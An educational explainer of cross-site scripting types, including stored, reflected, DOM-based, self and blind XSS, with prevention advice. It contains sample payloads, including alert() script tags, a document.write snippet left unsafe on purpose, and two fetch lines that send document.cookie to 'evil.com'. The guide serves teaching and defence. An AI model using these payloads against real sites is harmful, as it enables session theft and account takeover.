## Cross-site scripting 
**Cross-Site Scripting (XSS)** is a web security vulnerability that allows an attacker to inject malicious scripts (usually JavaScript) into web applications. These scripts can execute in a user’s browser, stealing data, redirecting users, or performing unauthorized actions.  

---

## **🔹 Types of XSS**  

### **1️⃣ Stored XSS (Persistent XSS)**
- **How it Works:** The malicious script is permanently stored in a database, message board, or comment section. When a user loads the infected page, the script executes automatically.  
- **Example:**
  - Attacker submits a comment containing `<script>alert('Hacked!');</script>`, which is saved in the database.
  - Every time a user visits the page, the script executes in their browser.  
- **Impact:** Can affect multiple users without any interaction.  
- **Prevention:**  
  ✅ Sanitize and encode user input before storing it.  
  ✅ Use Content Security Policy (CSP) to restrict script execution.  

---

### **2️⃣ Reflected XSS**
- **How it Works:** The malicious script is included in a URL or form input and reflected back by the server in an HTTP response. The victim must click a malicious link or submit a manipulated form.  
- **Example:**  
  ```
  https://example.com/search?q=<script>alert('Hacked!');</script>
  ```
  If the website directly displays `q` without sanitization, the script will execute in the user’s browser.  
- **Impact:** Requires user interaction but can be used in phishing attacks.  
- **Prevention:**  
  ✅ Encode user input before rendering it in the response.  
  ✅ Implement proper input validation.  
  ✅ Use security headers like `X-XSS-Protection`.  

---

### **3️⃣ DOM-Based XSS**
- **How it Works:** The attack modifies the Document Object Model (DOM) in the user's browser without interacting with the server.  
- **Example:**  
  ```javascript
  var userInput = location.hash.substring(1);  
  document.write("<h1>" + userInput + "</h1>");  
  ```
  If a user visits `https://example.com#<script>alert('Hacked!')</script>`, the script will execute because `document.write()` is directly inserting unvalidated data into the DOM.  
- **Impact:** The attack is executed entirely in the client-side, making it harder to detect.  
- **Prevention:**  
  ✅ Avoid `innerHTML`, `document.write()`, and `eval()`.  
  ✅ Use `textContent` or `innerText` to display user input safely.  
  ✅ Implement CSP to limit script execution.  

---
### **Self-XSS & Blind XSS Explained** 🚀  

XSS attacks come in many forms, and **Self-XSS** and **Blind XSS** are two less commonly known but still dangerous variations.  

---

## **1️⃣ Self-XSS (Self Cross-Site Scripting)**
### **🔹 What is Self-XSS?**
- In **Self-XSS**, the attacker tricks a victim into running malicious JavaScript in their own browser, usually by pasting code into the browser's developer console.  
- It relies on social engineering rather than exploiting a web application's vulnerability.  

### **🛑 Example of Self-XSS Attack**  
1. The attacker sends a message like:  
   > "Paste this code into your browser console to get free premium features!"  
2. The victim copies and pastes the following JavaScript into their browser’s developer console:  
   ```javascript
   fetch('https://evil.com/steal?cookie=' + document.cookie);
   ```
3. The script executes, stealing the user's session cookies or personal data.  

### **🔹 Impact of Self-XSS**  
- Usually, it affects **only the user who executes the script**.  
- However, an attacker could **escalate the attack** by using the script to send malicious requests, modify the user’s account, or spread the attack to others (turning it into stored XSS).  

### **✅ Prevention of Self-XSS**  
- **Browsers now warn users** when they try to paste code into the console (e.g., Chrome shows: _“Do not paste anything here if you don’t understand it”_).  
- Educate users about the risks of running unknown JavaScript.  
- Restrict developer tools for regular users if possible.  

---

## **2️⃣ Blind XSS (Time-Delayed XSS)**
### **🔹 What is Blind XSS?**
- **Blind XSS** occurs when a malicious script is **stored** and executed in a location where the attacker cannot see the immediate impact.  
- Unlike regular **Stored XSS**, the attacker does not see the execution in real-time.  
- The script triggers when an admin or internal user views the infected data.  

### **🛑 Example of Blind XSS Attack**  
1. The attacker injects a payload into a feedback form:  
   ```html
   <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
   ```
2. The website **saves the feedback** in a database.  
3. When an admin reviews the feedback in an internal dashboard, the script **executes in their browser**.  
4. The attacker **steals session tokens, performs actions as the admin, or escalates privileges**.  

### **🔹 Where Blind XSS is Found?**
- Admin panels  
- Log monitoring systems  
- Chat applications  
- Email processing systems  

### **✅ Prevention of Blind XSS**  
- **Sanitize input** before storing it in the database.  
- **Encode output** before displaying stored data.  
- Use **Content Security Policy (CSP)** to prevent inline script execution.  
- Implement **Web Application Firewalls (WAFs)** to detect and block XSS payloads.  
- Regularly audit internal tools and dashboards.  

---

## **🚀 Key Differences Between Self-XSS & Blind XSS**  

| Attack Type  | Execution Location | Victim Type | Detection Difficulty |
|-------------|------------------|------------|------------------|
| **Self-XSS** | Victim's own browser | The victim themselves | Easy (victim sees immediate effect) |
| **Blind XSS** | Internal system (e.g., admin panel) | Admins or internal users | Hard (delayed execution) |

---
### **Key Difference Between Stored XSS & Blind XSS** 🚀  

Both **Stored XSS** and **Blind XSS** involve injecting a malicious script into a web application that is later executed when viewed by a user. However, they have key differences in how they are detected and exploited.  

| **Feature**          | **Stored XSS** 📝 | **Blind XSS** 🎯 |
|----------------------|----------------|----------------|
| **Visibility to Attacker** | Attacker can see the result immediately after injection. | Attacker does **not** see the execution directly (it runs in a hidden/internal system). |
| **Target Victim** | Any user visiting the affected page. | Usually an **admin, moderator, or internal user** (e.g., reviewing logs, reports, or emails). |
| **Common Targets** | Comment sections, user profiles, message boards, product reviews, etc. | Internal dashboards, email viewers, log management tools, ticketing systems, etc. |
| **Attack Execution Time** | Immediate upon visiting the page. | **Delayed** until an internal user/admin views the data. |
| **Detection & Exploitation** | Easier to test since the attacker sees the execution immediately. | Harder to detect because the attacker must wait for an internal user to trigger it. |
| **Example Scenario** | A script injected into a public comment section runs when another user views it. | A script injected into a **support ticket** executes when a **support agent** reviews it. |

### **Summary**
- **Stored XSS** is **visible to the attacker** and affects public-facing users.  
- **Blind XSS** is **not visible to the attacker** and usually affects **admins or internal users** in an indirect way.  

---

## **🚀 How to Prevent XSS?**
✅ **Input Validation** – Reject inputs with script tags or special characters.  
✅ **Output Encoding** – Convert `<` to `&lt;` and `>` to `&gt;` before displaying.  
✅ **Content Security Policy (CSP)** – Block inline JavaScript execution.  
✅ **Use HTTP Security Headers** – `X-XSS-Protection`, `Content-Security-Policy`.  
✅ **Sanitize User Input** – Use libraries like DOMPurify for safe HTML parsing.  
✅ **Avoid Dangerous JS Methods** – Do not use `innerHTML`, `document.write()`, or `eval()` with user input.  

---
